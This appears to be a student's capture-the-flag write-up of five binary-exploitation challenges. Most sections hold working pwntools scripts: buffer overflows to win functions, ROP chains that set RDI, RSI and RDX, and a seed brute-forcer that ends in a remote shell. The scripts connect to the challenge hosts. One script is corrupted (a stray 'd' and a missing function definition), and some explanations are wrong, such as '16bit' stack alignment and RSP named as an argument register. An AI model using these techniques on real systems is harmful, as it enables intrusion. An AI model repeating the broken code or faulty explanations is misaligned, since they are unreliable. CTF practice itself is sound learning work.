# 1. Immadev 

---

##  Challenge Description

- Logic based exploitation

---

##  Files Provided

- `ImmaDeveloper` – ELF 64-bit binary


```bash
garri@LAPTOP-J4CRR4GO:/mnt/c/Users/garri/Desktop/JTP-2/binex/immadev/src$ ./ImmaDeveloper
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
```
## Initial Recon
 1.Running the elf file and analysing the output <br>
 2. File gives user 3 options to deal with <br>
 3. Seeing what the options do<Br>
 4. Program is made so that user is not able to run the printflag() function just by selecting "2" as a prompt<br>

## Vulnerability analsyis
 1. Opening the file in IDA<br>
 
   <img width="1069" height="494" alt="image" src="https://github.com/user-attachments/assets/7cea639d-56bf-4124-a15d-6963a14f12af" /> <br>
  
 2. After user input handleoption() is called <Br>
 
  <img width="695" height="692" alt="image" src="https://github.com/user-attachments/assets/771ef596-3a7b-467c-99e5-c31f15a7c506" /> <Br>
  
 4. The program is designed to store user input as an array, and loop through the respective options<br>
 5. printFlag() func will not be called if "2" is the first element of the user<br>
 6. The input prompt (v1) should follow the constraints v1> 0& v1<=3 <br>

## Exploit strat
- Sending input with "2" not as the first element, so anything like "123" "321" "!23" will work and print the flag

```
## Flag: nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

# 2. Performative

---

##  Challenge Description

- Buffer overflow

---

##  Files Provided

- `perf` – ELF 64-bit binary


```bash
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: woahwoahWOHHAH OHAHAHAO
Generating your buffer...

Your custom buffer:
========================
```
## Initial Recon
 1. Running the elf file and analysing the output <br>
 2. File prompts user to enter a buffer <br>
 3. Clearly hinting towards a buffer overflow <Br>
 4. The program returns prints the input string <br>

## Vulnerability analsyis
1. Opening the file in IDA<br>

 <img width="685" height="372" alt="image" src="https://github.com/user-attachments/assets/34c1fcb6-49b6-4b84-a423-1168499a1de9" />
<br>

2. Analyzing win() in the disassembler<Br>

 <img width="522" height="216" alt="image" src="https://github.com/user-attachments/assets/eb3ccc51-a162-42a9-ac18-d1f973e07d5e" />
 <Br>
 
3. The program will print the flag when we execute the win() func using buffer overflow<br>


## Exploit strat
 1. Finding the padding/offset via De brujn's sequence or eyeballing <br>
 2. packing the address of win() func to maintain endian-ness<Br>
 3. Sending payload to the executable , locally and remotely

### Exploit script
```python
from pwn import *

context.binary = "./perf"
context.arch = "amd64"
context.log_level = "info"

OFFSET = 40
PRINTFLAG = 0x4011E9

REMOTE_HOST = "performative.nitephase.live"
REMOTE_PORT = 56743

d
    p = remote(REMOTE_HOST, REMOTE_PORT)
    log.info("Connected to remote server")
    
    payload = b"A" * OFFSET + p64(PRINTFLAG)
    
   
    p.sendlineafter(b"Buffer:", payload)

    p.interactive()

```

```
## Flag: nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
```
# 3. Property in Manipal

---

##  Challenge Description

- ROP
---

##  Files Provided

- `manipal` – ELF 64-bit binary


```bash
garri@LAPTOP-J4CRR4GO:/mnt/c/Users/garri/Desktop/JTP-2/binex/property/src$ ./manipal
I bought a property in Mandavi
& what they do for you is,
they give you the property.
Enter your name to signup for the property: moo
Hello, moo
�
Enter the amount for customizations: 1212
```
## Initial Recon
 1. Running the elf file and analysing the output <br>
 2. File prompts user to enter inputs <br>
 3. At first glance feels like another buffer overflow <Br>
 4. The program returns prints the input (name)string <br>
 5. Running checksec commands to see what protections are enabled

## Vulnerability analsyis
1. Opening the file in IDA<br>

 <img width="757" height="230" alt="image" src="https://github.com/user-attachments/assets/a782aaed-fc98-4e91-bae6-a3782002778e" />

<br>
 2. analyzing vuln() in IDA<Br>
 
 <img width="616" height="336" alt="image" src="https://github.com/user-attachments/assets/3b1f8fd5-ab68-478a-87ea-7447147542d9" />

 <Br>
 3. Plain old buffer overflow it is. Or is it?


## Exploit strat
 1. Finding the padding/offset via De brujn's sequence or eyeballing <br>
 2. packing the address of win() func to maintain endian-ness<Br>
 3. Sending payload to the executable , locally and remotely<br>

# Note:
- We encounter an error if we proceed according to this strat
- The program segafaults but why?
- Stack misalignment
- Stack needs to be 16bit aligned
- When we simply overflow the stack we end up messing up the stack structure and register values making the stack look like a "murder scene" .
- We need to fix this error by aliging the stack . "Rudimentary" application of ROP.

### Exploit script
```python
#!/usr/bin/env python3
from pwn import *

binary_path = './manipal'
win_addr = 0x401196
ret_gadget = 0x40101a

context.arch = 'amd64'
context.log_level = 'info'

if args.REMOTE:
    io = remote('propertyinmanipal.nitephase.live', 42586)
else:
    io = process(binary_path)

io.recvuntil(b'Enter your name to signup for the property: ')
io.sendline(b'TestUser')

io.recvuntil(b'Enter the amount for customizations: ')

payload = b'A' * 72 + p64(ret_gadget) + p64(win_addr)
io.sendline(payload)

io.interactive()
```
## Why this works?
1. We using functions inside the pwntools library to find return gadgets so we can align the stack using ROP
2. The most basic ROP gadget is<br>
```
pop rdi;ret
```
3. This return gadgets pops 8 bytes from the top of the stack and stores them in the rdi register<br>
4. Also moves rsp forward by 8 bytes and returns to the stack <Br>
  this way we can effectively fix stack misalignment without segfault<Br>
- To summarize
  We use gadgets like pop rdi; ret to prepare registers (like RDI for arg1) and advance the stack (RSP), so that when execution ret jumps into the target function, it sees valid arguments, aligned stack, and a proper return address.
```
## Flag: nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5} 
```
## Resources:
Suraj my goated mentor ^^

# 4. IQ Test

---

##  Challenge Description

- ROP chaining

---

##  Files Provided

- `Chall` – ELF 64-bit binary


```bash
=========== Welcome to the Exploitation Dojo ==============
You must first prove your knowledge if you want access to my secrets
Question 1: In an x86-64 Linux architecture, a function reads its arguments from the stack, left-to-right. True or False?
[1] True
[2] False
> 2
Correct!
Question 2: In an x86-64 Linux architecture, which register holds the first integer or pointer argument to a function?
[1] RDI
[2] RSI
[3] RAX
[4] RCX
> 1
Correct!
Question 3: In an x86-64 Linux architecture, where is the return value of a function typically stored?
[1] RDX
[2] RSP
[3] RBP
[4] RAX
> 4
Correct!
You may have passed my test but I must see you display your knowledge before you can access my secrets
Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401

```
## Initial Recon
 1.Running the elf file and analysing the output <br>
 2. File prompts user to enter inputs <br>
 3. Starts with a quiz which is answered easily by yours truly <Br>
 4. After passing the quiz the details of first step of the challenge are passed to us <br>
 5. we must simply jump to the win() function, analyzing in binary takes no argument <br>

## Vulnerability analsyis
 1. Opening the file in IDA<br>
 2. analyzing win1() in IDA<Br>
 
  <img width="1139" height="645" alt="image" src="https://github.com/user-attachments/assets/1fec8d1c-f291-422c-9c40-8522de9fcc8f" />
  
 <Br>
 3. Plain old buffer overflow it is. Or is it?


## Exploit strat
 1. Finding the padding/offset via De brujn's sequence or eyeballing <br>
 2. packing the address of win1() func to maintain endian-ness<Br>
 3. Using rop gadget to align the stack and see what happens <br>


## Next steps
```bash
You have passed the first challenge. The next one won't be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. <Br>
Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?} <Br>
```
1.  Analyzing win2() in IDA<BR>

 <img width="436" height="136" alt="image" src="https://github.com/user-attachments/assets/b4ea5ee5-a7eb-463b-bac2-3f671db00fe4" />
 
<br>
2. Calculating offset by viewing the the RBP val. <Br>
3. offset: 0x20 + 0x08 = 0x28 = 40bytes <Br>
4. Crafting the required payload then sending it again to the terminal
5. Since win2() takes 2 arguments we must set RDI and RSP accordingly <Br>
   
```bash
Continue:
You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE].<Br>
 You must venture out and find the temple yourself. I believe in you
nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)
```
- Win3()
  
   <img width="547" height="187" alt="image" src="https://github.com/user-attachments/assets/c1aa8b83-ccf5-4fba-aeb2-b20bb6e247b3" />
   
<br>
1. Again via RBP calculating offset for win2() : 0x30 + 0x08 = 0x38 = 56 bytes
2. Win3() function needs 3 arguments so we need to pop the respective values inside RDI RSI AND RDX and then make an ROP chain again and send to function <br>
3. This gives us our flag.
   
### Note:
- The rop.find_gadget command in PWNTOOLS library makes it easier to locate gadgets otherwise we would have to chain in the addresses of the gadgets manually   
### Exploit script
Chaining everything together we get the following script<BR>
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

MODE = "remote"
# MODE = "local"

if MODE == "local":
    p = process("./chall")
else:
    p = remote("iqtest.nitephase.live", 51823)
    # for testing remote on your own server:
    # p = remote("localhost", 6161)

elf = ELF("./chall")

# -------------------------
# menu answers
# -------------------------
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'>', b'4')

# -------------------------
# gadgets
# -------------------------
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

# -------------------------
# FIRST PAYLOAD → win1()
# -------------------------
offset1 = 152
win1_addr = elf.symbols["win1"]

payload1 = flat(
    b"A" * offset1,
    p64(ret_gadget),
    p64(win1_addr)
)
p.sendline(payload1)

# -------------------------
# SECOND PAYLOAD → win2(0xDEADBEEF)
# -------------------------
offset2 = 40
arg2 = 0xDEADBEEF
win2_addr = 0x401314

payload2 = flat(
    b"A" * offset2,
    p64(pop_rdi),
    p64(arg2),
    p64(ret_gadget),
    p64(win2_addr)
)
p.sendline(payload2)

# -------------------------
# THIRD PAYLOAD → win3(a1, a2, a3)
# -------------------------
offset3 = 56
arg1 = 0xDEADBEEF
arg2 = 0xDEAFFACE
arg3 = 0xFEEDCAFE
win3_addr = 0x4011E6

payload3 = flat(
    b"A" * offset3,
    p64(pop_rdi),
    p64(arg1),
    p64(ret_gadget),
    p64(pop_rsi),
    p64(arg2),
    p64(ret_gadget),
    p64(pop_rdx),
    p64(arg3),
    p64(ret_gadget),
    p64(win3_addr)
)
p.sendline(payload3)

p.interactive()

```

```
# flag nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}

```
## Resources:
.

# 5. Hungry

---

##  Challenge Description

- Bruteforcing

---

##  Files Provided

- `burgers_are_mid` – ELF 64-bit binary


```bash
Welcome to BitBurger, home of the Bit Burger! May I take your order?

What would you like on your Bit Burger?
 - a bun (y/n)? n
 - a patty (y/n)? $

```
## Initial Recon
 1. Running the elf file and analysing the output <br>
 2. File prompts user to enter inputs <br>
 3. Asks for ingredients and stuff <Br>
 4. Pixelated pickels? really? <br>
 5. Well yeah normally running the program wasnt going to work because i dont need any of that linux mint on my bit burger <br>

## Vulnerability analsyis
 1. Opening the file in IDA<br>

  <img width="630" height="501" alt="image" src="https://github.com/user-attachments/assets/09c4a1e7-3e01-497d-b06d-693b692c909b" />

 <Br>
  2. We have to enter "$" to get access to manager_control_panel() then proceed
  3. analyzing managar_control_panel() in IDA<Br>
 
  <img width="503" height="401" alt="image" src="https://github.com/user-attachments/assets/61347594-5267-487f-aa10-6509e66aec24" />
<Br>


## Exploit strat
 1. Brute forcing PID on remote server
 2. Use the same libc functions as the file<Br>
 3. Pray to god<br>


#
### Exploit script 
Chaining everything together we get the following script<BR>
```python
#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import time

# Configuration
HOST = 'hunger.nitephase.live'
PORT = 53791

# Load libc for rand()
libc = CDLL('libc.so.6')

context.log_level = 'info'


def main():
    current_time = int(time.time())

    for pid in range(1, 5000):
        io = None
        try:
            io = remote(HOST, PORT)

            io.recvuntil(b'a bun (y/n)?')
            io.sendline(b'$')

            seed = current_time ^ pid
            libc.srand(seed)
            code = libc.rand() % 1000000

            if pid % 100 == 0:
                log.info(f"Trying PID {pid}, code: {code}")

            io.recvuntil(b'Enter manager access code: ')
            io.sendline(str(code).encode())

            response = io.recvline(timeout=1)

            if response and b"Access granted" in response:
                log.success(
                    f"Success! Time: {current_time}, PID: {pid}, Code: {code}"
                )
                log.info("Dropping to interactive shell...")
                io.interactive()
                return

            io.close()

        except Exception as e:
            if io:
                io.close()
            continue

    log.error("Failed to find correct code")


if __name__ == "__main__":
    main()




```
```bash
garri@LAPTOP-J4CRR4GO:/mnt/c/Users/garri/Desktop/JTP-2/binex/hungry/src$ python3 ex.py
[*] Trying with time: 1765061420 (offset: -2)
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Closed connection to hunger.nitephase.live port 53791
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[+] Success! Time: 1765061420, PID: 23, Code: 368793
[*] Dropping to interactive shell...
[*] Switching to interactive mode
$ cat flag.txt
nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
```
### Plain old cat to finish the deal
```
# flag: ite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}

```
## Resources:
Aryan :3 

